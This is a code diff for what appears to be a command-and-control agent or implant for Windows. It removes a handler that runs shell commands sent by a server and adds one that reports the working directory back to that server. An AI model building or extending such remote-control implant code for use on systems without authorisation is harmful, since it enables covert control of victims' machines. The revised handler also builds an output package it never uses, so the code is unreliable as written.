@@ -1,39 +1,35 @@
+#include "WrapPwd.h"
+#include "BasePwd.h"
 #include <windows.h>
-#include "BaseShell.h"
-#include "WrapShell.h"
-#include <string>
-#include <iostream>
-#include <cstdio>
-#include <cstring>
 
-BOOL wrapShell(PParser arguments)
+BOOL wrapPwd(PParser arguments)
 {
     SIZE_T uuidLength = 36;
     PCHAR taskUuid = getString(arguments, &uuidLength);
-    UINT32 nbArg = getInt32(arguments);
-    SIZE_T size = 0;
-    PCHAR cmd = getString(arguments, &size);
-
-    cmd = (PCHAR)LocalReAlloc(cmd, size + 1, LMEM_MOVEABLE | LMEM_ZEROINIT);
 
     PPackage responseTask = newPackage(POST_RESPONSE, TRUE);
     addString(responseTask, taskUuid, FALSE);
 
     PPackage output = newPackage(0, FALSE);
     
-    std::string result;
-    BOOL success = baseShell(cmd, result);
+    #define MAX_RESULT_SIZE 256
+    char result[MAX_RESULT_SIZE];
+    result[0] = '\0'; // Initialize the result string
+    BOOL success = basePwd(result, MAX_RESULT_SIZE);
 
     if (!success)
     {
-        char result[256];
-        snprintf(result, sizeof(result), "[CD] Error executing command => %s !\n", cmd);
-        addString(output, result, FALSE);
-        return FALSE;
+        // Add an error message without using std::string
+        addString(output, "[PWD] Error getting current working directory!\n", FALSE);
     }
-    
-    addBytes(responseTask, (PBYTE)result.c_str(), result.length(), TRUE);
+    else
+    {
+        // Add the result to the output package
+        addBytes(responseTask, (PBYTE)result, CustomStrLen(result), TRUE);
+    }
+
+    // Send the output package
     Parser* ResponseParser = sendPackage(responseTask);
 
-    return TRUE;
+    return success;
 }
